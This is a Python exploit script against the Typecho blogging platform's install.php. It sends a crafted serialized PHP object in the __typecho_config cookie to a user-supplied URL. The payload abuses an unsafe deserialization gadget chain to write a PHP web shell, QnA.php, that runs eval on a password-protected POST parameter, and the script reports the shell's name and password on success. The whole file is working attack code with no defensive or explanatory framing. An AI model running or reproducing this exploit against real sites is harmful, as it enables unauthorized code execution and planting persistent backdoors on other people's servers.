#! /usr/bin/env python
#! -*-coding:utf-8 -*-
import requests
import base64
import urllib.parse
import sys

getshell_payload = b"""\
a:2:{\
s:7:"adapter";\
O:12:"Typecho_Feed":3:{\
s:19:"\x00Typecho_Feed\x00_type";\
s:8:"ATOM 1.0";\
s:20:"\x00Typecho_Feed\x00_items";\
a:1:{\
i:0;\
a:1:{s:6:"author";\
O:15:"Typecho_Request":2:{\
s:24:"\x00Typecho_Request\x00_params";\
a:1:{s:10:"screenName";\
s:63:"file_put_contents('QnA.php','<?php @eval($_POST[deadc0de]);?>')";}\
s:24:"\x00Typecho_Request\x00_filter";\
a:1:{i:0;s:6:"assert";}}}}\
s:10:"dateFormat";N;}\
s:6:"prefix";s:8:"typecho_";}\
"""

def url_get_ready(url):
    domain = urllib.parse.urlsplit(url).netloc
    if not domain:
        print("Bad url!")
        exit()
    new_url = 'http://' + domain + '/install.php'
    return new_url

def test_url(url, headers):
    test = requests.get(url, headers = headers, params = {"finish":"1"})
    return test.cookies if test.status_code == 200 else None

def getshell(url, headers, cookies):
    cookies["__typecho_config"] = urllib.parse.quote(base64.b64encode(getshell_payload))
    ret = requests.get(typecho_install_url,\
                params = {"finish":"1"}, headers = headers, cookies=cookies)
    return True if ret.status_code == 500 else False

if __name__ == "__main__":
    if len(sys.argv) == 2:
        typecho_install_url = url_get_ready(sys.argv[1])
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) \
Gecko/20100101 Firefox/52.0",
        "Referer": typecho_install_url
        }
        C = test_url(typecho_install_url, headers)
        if getshell(typecho_install_url, headers, C):
            print("OK!\nwebshell: QnA.php\npassword: deadc0de")
        else:
            print("Fail!")
    else:
        print("Usage: py typecho <url>")